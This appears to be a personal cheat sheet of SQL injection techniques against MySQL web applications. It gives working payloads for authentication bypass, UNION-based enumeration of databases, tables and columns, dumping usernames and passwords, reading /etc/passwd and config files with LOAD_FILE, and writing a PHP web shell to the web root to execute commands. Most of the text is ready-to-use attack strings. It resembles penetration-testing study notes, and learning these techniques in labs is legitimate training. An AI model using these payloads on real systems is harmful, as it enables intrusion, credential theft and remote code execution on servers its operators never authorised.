after a username you can add one of the following

payload               URL encoded
'                           %27
"                          %22
\#                          %23
;                           %3B
)                           %29

bypassing login pages

```
' or '1' = '1
```
When trying to bypass authentication it is best to try commenting out like
```
tom' OR '1' = '1' -- -
```

Leave the last quotation out because it uses the one in the sql code

**basic union clause**

```
SELECT * FROM ports UNION SELECT * FROM ships;
```

You can detect the number of columns by user ORDER BY or UNION

**ORDER BY**

for ORDER BY function you increment the number each time untill you get an error.

So start with 2 since every table has at least one column.  

```
' order by 1-- -
```

**UNION**

```
UNION select 1,2,3-- -
```

keep adding column numbers until you get a successful answer back.

when filling columns with junk data 'NULL' is the best option as it fits all data types.

**INJECTION LOCATION**

put your injection in a printed section due to some columns not being presented on the screen.

you can use @@version to get the database version.

SELECT POW(1,1)  use when we only have numeric output expected output is 1

SELECT SLEEP(5) used for Blind/No Output expected output delays page response for 5 seconds and returns 0.  

injection example

```
' UNION select 1,user(),3,4-- -
```


to properly form SELECT queries you need the following information,
List of databases
List of tables within each database
List of columns within each table.

```
SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;
```

injection example of above command to find all the databases

```
CN' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -
```

identifying table names injection example

```
cn' UNION select 1,TABLE_NAME, TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev' -- -
```

Identifying column names injection example

```
cn' UNION select 1,COLUMN_NAME, TABLE_NAME, TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -
```

injection example of pulling data from tables

```
cn' UNION select 1, username, password, 4 from dev.credentials-- 
```

identify what user is executing the queries

```
' UNION SELECT 1, user(), 3, 4-- -
```
or
```
' UNION SELECT 1, user, 3, 4 from mysql.user-- -
```

look at what privileges you have as that user

```
' UNION SELECT 1, super_priv, 3, 4 from mysql.user-- -
```

look at a single user
```
' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="username"-- -
```

if query returns Y, you have superuser privileges.


you can also see other privileges we have directly from the schema with
```
' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- -
```

```
' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'username'@'localhost'"-- -
```

if the FILE privilege is listed for our user this enables us to read files and potentiall even write files.

sql injection to read files

```
' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
```
another example
```
' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -
```

viewing the php file can lead to other files loaded from including config.php which could include passwords, the search.php could include passwords as well.

**writing files**

to be able to write files to the back-end server using MySQL database we require three thing
FILE privilege enabled
MySQL global secure_file_Priv variable **not** enabled
Write access to the location we want to write to on the back-end server

identify if secure_file_priv is enabled

```
' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
```

If the value is empty, we can read/write files to any location

write file example

```
' union select 1, 'file written successfully!', 3,4 into outfile '/var/www/html/proof.txt'-- -
```

writing a web shell
```
<?php system($_REQUEST[0]); ?>
```
UNION INJECTION PAYLOAD
```
' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
```

you can then visit the shell.php sit
http://server_IP:PORT/shell.php?

test with the id command
http://server_IP:PORT/shell.php?0=id

%20 is the php code to add arguments
example
```
shell.php?0=ls%20-la
```